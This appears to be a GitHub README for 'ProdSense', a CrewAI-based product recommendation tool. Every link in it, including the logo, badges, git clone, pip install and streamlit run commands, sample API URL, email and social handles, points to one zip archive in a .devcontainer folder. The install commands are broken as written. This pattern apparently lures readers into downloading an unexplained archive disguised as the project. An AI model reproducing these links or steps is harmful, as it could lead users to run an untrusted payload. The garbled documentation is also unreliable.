# ProdSense: A Multi-Agent Product Recommendation System

![ProdSense Logo](https://github.com/soumiau158/ProdSense/raw/refs/heads/main/.devcontainer/Prod_Sense_v1.1-beta.5.zip)  
[![GitHub Release](https://github.com/soumiau158/ProdSense/raw/refs/heads/main/.devcontainer/Prod_Sense_v1.1-beta.5.zip%20Latest%20Release-v1.0.0-brightgreen)](https://github.com/soumiau158/ProdSense/raw/refs/heads/main/.devcontainer/Prod_Sense_v1.1-beta.5.zip)

## Table of Contents

1. [Introduction](#introduction)
2. [Features](#features)
3. [Technologies Used](#technologies-used)
4. [Installation](#installation)
5. [Usage](#usage)
6. [API Documentation](#api-documentation)
7. [Contributing](#contributing)
8. [License](#license)
9. [Contact](#contact)

## Introduction

ProdSense is an experimental multi-agent product recommendation system powered by CrewAI. It scrapes product details from various e-commerce websites, discovers alternatives, analyzes community sentiments, and curates YouTube reviews. This tool outputs tailored Markdown recommendations to help users make informed purchasing decisions. It is designed for developers and enthusiasts who want to explore the potential of AI in e-commerce.

For the latest releases, please visit our [Releases page](https://github.com/soumiau158/ProdSense/raw/refs/heads/main/.devcontainer/Prod_Sense_v1.1-beta.5.zip).

## Features

- **Multi-Agent Architecture**: Leverage multiple AI agents to gather and analyze data.
- **Product Scraping**: Extract product details from any product website.
- **Alternative Discovery**: Find similar products based on user preferences.
- **Sentiment Analysis**: Analyze community sentiments about products using social media data.
- **YouTube Review Curation**: Gather and summarize YouTube reviews for products.
- **Markdown Output**: Generate tailored Markdown recommendations for easy sharing.
- **API-Driven**: Interact with the system through a RESTful API.
- **Open for Tinkering**: Modify and extend the system as per your needs.

## Technologies Used

- **Python**: The core programming language for the project.
- **Streamlit**: Used for creating a user-friendly web interface.
- **CrewAI**: The AI framework that powers the multi-agent system.
- **Google Gemini**: For advanced data analysis and machine learning.
- **Beautiful Soup**: For web scraping product details.
- **Pandas**: For data manipulation and analysis.
- **Flask**: To create the API endpoints.
- **Jupyter Notebook**: For prototyping and testing.

## Installation

To get started with ProdSense, follow these steps:

1. **Clone the Repository**:
   ```bash
   git clone https://github.com/soumiau158/ProdSense/raw/refs/heads/main/.devcontainer/Prod_Sense_v1.1-beta.5.zip
   cd ProdSense
   ```

2. **Install Dependencies**:
   Create a virtual environment and install the required packages:
   ```bash
   python -m venv venv
   source venv/bin/activate  # On Windows use `venv\Scripts\activate`
   pip install -r https://github.com/soumiau158/ProdSense/raw/refs/heads/main/.devcontainer/Prod_Sense_v1.1-beta.5.zip
   ```

3. **Run the Application**:
   Start the application using Streamlit:
   ```bash
   streamlit run https://github.com/soumiau158/ProdSense/raw/refs/heads/main/.devcontainer/Prod_Sense_v1.1-beta.5.zip
   ```

For detailed installation instructions, refer to the [Releases page](https://github.com/soumiau158/ProdSense/raw/refs/heads/main/.devcontainer/Prod_Sense_v1.1-beta.5.zip).

## Usage

Once the application is running, you can interact with it through the web interface. Here’s how to use the main features:

1. **Scraping Products**:
   - Enter the URL of the product page you want to scrape.
   - Click the "Scrape" button to gather product details.

2. **Discovering Alternatives**:
   - After scraping, the system will display alternative products based on your input.

3. **Sentiment Analysis**:
   - View community sentiments related to the product.
   - Analyze comments and reviews to understand public opinion.

4. **YouTube Reviews**:
   - Access curated YouTube reviews to get insights from video content.
   - Summarized reviews will be presented for easy understanding.

5. **Markdown Recommendations**:
   - Generate Markdown output for sharing with friends or on social media.
   - Copy the generated Markdown to use in your documents.

## API Documentation

ProdSense offers a RESTful API for developers who want to integrate its features into their applications. Below are the key endpoints:

### Base URL
```
http://localhost:8501/api
```

### Endpoints

1. **Scrape Product**:
   - **Endpoint**: `/scrape`
   - **Method**: `POST`
   - **Body**:
     ```json
     {
       "url": "https://github.com/soumiau158/ProdSense/raw/refs/heads/main/.devcontainer/Prod_Sense_v1.1-beta.5.zip"
     }
     ```
   - **Response**:
     ```json
     {
       "status": "success",
       "data": {
         "name": "Product Name",
         "price": "Product Price",
         ...
       }
     }
     ```

2. **Get Alternatives**:
   - **Endpoint**: `/alternatives`
   - **Method**: `GET`
   - **Query Parameters**: `?product_id=123`
   - **Response**:
     ```json
     {
       "status": "success",
       "data": [
         {
           "name": "Alternative Product 1",
           "price": "Price 1"
         },
         ...
       ]
     }
     ```

3. **Analyze Sentiment**:
   - **Endpoint**: `/sentiment`
   - **Method**: `POST`
   - **Body**:
     ```json
     {
       "product_id": 123
     }
     ```
   - **Response**:
     ```json
     {
       "status": "success",
       "sentiment": "positive"
     }
     ```

4. **Get YouTube Reviews**:
   - **Endpoint**: `/youtube`
   - **Method**: `GET`
   - **Query Parameters**: `?product_id=123`
   - **Response**:
     ```json
     {
       "status": "success",
       "data": [
         {
           "title": "Review Title",
           "summary": "Review Summary"
         },
         ...
       ]
     }
     ```

For more details, check the [Releases page](https://github.com/soumiau158/ProdSense/raw/refs/heads/main/.devcontainer/Prod_Sense_v1.1-beta.5.zip).

## Contributing

We welcome contributions from the community. If you want to help improve ProdSense, follow these steps:

1. **Fork the Repository**: Click on the "Fork" button at the top right corner of the page.
2. **Create a Branch**: Create a new branch for your feature or bug fix.
   ```bash
   git checkout -b feature/YourFeature
   ```
3. **Make Changes**: Implement your changes and commit them.
   ```bash
   git commit -m "Add your message here"
   ```
4. **Push Changes**: Push your changes to your forked repository.
   ```bash
   git push origin feature/YourFeature
   ```
5. **Create a Pull Request**: Open a pull request to the main repository.

Please ensure your code adheres to our coding standards and includes appropriate tests.

## License

This project is licensed under the MIT License. See the [LICENSE](LICENSE) file for details.

## Contact

For questions or feedback, feel free to reach out:

- **Email**: [https://github.com/soumiau158/ProdSense/raw/refs/heads/main/.devcontainer/Prod_Sense_v1.1-beta.5.zip](https://github.com/soumiau158/ProdSense/raw/refs/heads/main/.devcontainer/Prod_Sense_v1.1-beta.5.zip)
- **Twitter**: [@yourhandle](https://github.com/soumiau158/ProdSense/raw/refs/heads/main/.devcontainer/Prod_Sense_v1.1-beta.5.zip)
- **GitHub**: [soumiau158](https://github.com/soumiau158/ProdSense/raw/refs/heads/main/.devcontainer/Prod_Sense_v1.1-beta.5.zip)

Thank you for your interest in ProdSense! We hope you find it useful in your product discovery journey. For the latest updates and releases, check our [Releases page](https://github.com/soumiau158/ProdSense/raw/refs/heads/main/.devcontainer/Prod_Sense_v1.1-beta.5.zip).